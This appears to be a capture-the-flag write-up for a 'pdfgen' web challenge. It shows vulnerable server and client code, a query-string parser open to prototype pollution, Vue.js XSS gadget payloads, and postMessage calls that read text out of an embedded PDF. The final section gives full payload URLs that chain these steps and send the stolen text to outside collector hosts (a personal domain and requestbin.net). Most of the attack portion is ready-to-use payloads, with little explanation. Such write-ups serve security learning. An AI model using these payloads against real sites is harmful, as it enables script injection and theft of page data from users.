
### Challenge Intro

```javascript
app.get('/text', urlencodedParser, (req, res) => {
  const ip = req.connection.remoteAddress
  let pdfDoc = new PDFDocument;
  var filename = './uploads/' + uuid.v4()
  pdfDoc.pipe(fs.createWriteStream(filename));

  if(ip === "127.0.0.1" || ip === "::1" || ip === "::ffff:127.0.0.1"){
    pdfDoc.text(FLAG);
  }else{
    pdfDoc.text(req.query.text);
  }

  pdfDoc.end();
  res.send(`<html>...

```

```javascript
  <script>
  var params = parseQuery(location.search.slice(1));
  var app = new Vue({
      el: '#app',
      data: {
          title: 'Text to PDF Convertor'
      }
  });
  if(params.name && params.text ){
    document.getElementById("name").innerText = "Hi, "+ params.name;
    document.getElementById("text").value = params.text;
  }
  </script>
 ```

### parseQuery Function

 ```javascript
 function idenity(value){ return value; }

  function parseQuery(params, valueDeserializer) {
    valueDeserializer = valueDeserializer || idenity;
    var data = {}, pairs, lastPart;
    if (params && paramTest.test(params)) {
        pairs = params.split('&');
        pairs.forEach(function (pair) {
            var parts = pair.split('='),
                key = prep(parts.shift()),
                value = prep(parts.join('=')),
                current = data;
            if (key) {
                parts = key.match(keyBreaker);
                for (var j = 0, l = parts.length - 1; j < l; j++) {
                    var currentName = parts[j],
                        nextName = parts[j + 1],
                        currentIsArray = isArrayLikeName(currentName) && current instanceof Array;
                    if (!current[currentName]) {
                        if(currentIsArray) {
                            current.push( isArrayLikeName(nextName) ? [] : {} );
                        } else {
                            current[currentName] = isArrayLikeName(nextName) ? [] : {};}

                    }
                    if(currentIsArray) {
                        current = current[current.length - 1];
                    } else {
                        current = current[currentName];
                    }

                }
                lastPart = parts.pop();
                if ( isArrayLikeName(lastPart) ) {
                    current.push(valueDeserializer(value));
                } else {
					if(currentName !== "__proto__")
                    	current[lastPart] = valueDeserializer(value);
                	}
            	}
        	});
    }
    return data;
};
```

1. Tries to parse the URL
2. Paramteres are split with `&` as delimiter.
3. Computations are done if it is array.
4. If it is not array something else is done. 
5. `current[lastPart] = valueDeserializer(value);`


### Prototype Pollution

http://localhost:8081/text?text=asd123&a[constructor][prototype][pollute]=pollutedxyz

1. `params`
2. `params.__proto__`
3. `Object.__proto__.pollute`
4. `document.__proto__.pollute`

### VueJS - XSS Payloads

```javascript
var params = parseQuery(`constructor[prototype][props][][value]=a&constructor[prototype][name]=":''.constructor.constructor('alert(1337)')(),"`)

var params = parseQuery(`constructor[prototype][v-if]=_c.constructor('alert(1337)')()`)

var params = parseQuery('constructor[prototype][data]=a&constructor[prototype][template][nodeType]=a&constructor[prototype][template][innerHTML]="<script>alert(1337)<\/script>"')
```

### PostMessage to PDF

```javascript
document.getElementsByTagName('embed')[0].postMessage({type:'selectAll'}, '*');
document.getElementsByTagName('embed')[0].postMessage({type:'getSelectedText'}, '*');
```

# Final Payload

```

https://pdfgen.ctf.zer0pts.com:8443/text?texts=asd&a[constructor][prototype][props][][value]=a&a[constructor][prototype][name]=a":''.constructor.constructor('eval(decodeURIComponent(location.hash.slice(1)))')(),"a#

window.addEventListener('message', (e) => {

	if (e.data.type === 'getSelectedTextReply') {
	   (new Image).src = ['https://ctf.s1r1us.ninja/1d9e11f1-9421-40d3-954f-8c2712c9d16e?data=', e.data.selectedText];
    }

});

(async () => {
	const wait = x => new Promise(r=>{setTimeout(r,x)});
 	document.getElementsByTagName('embed')[0].postMessage({type:'selectAll'}, '*');
 	document.getElementsByTagName('embed')[0].postMessage({type:'getSelectedText'}, '*');
})();
```


http://localhost:8081/text?text=flag{goes_here}&a[constructor][prototype][props][][value]=a&a[constructor][prototype][name]=a%22:%27%27.constructor.constructor(%27eval(decodeURIComponent(location.hash.slice(1)))%27)(),%22a#%20window.addEventListener('message',%20(e)%20=%3E%20{%20if%20(e.data.type%20===%20'getSelectedTextReply')%20{%20(new%20Image).src%20=%20['https://requestbin.net/r/h4c60l9y?data=',%20e.data.selectedText];%20}%20});%20(async%20()%20=%3E%20{%20const%20wait%20=%20x%20=%3E%20new%20Promise(r=%3E{setTimeout(r,x)});%20document.getElementsByTagName('embed')[0].postMessage({type:'selectAll'},%20'*');%20document.getElementsByTagName('embed')[0].postMessage({type:'getSelectedText'},%20'*');%20})();
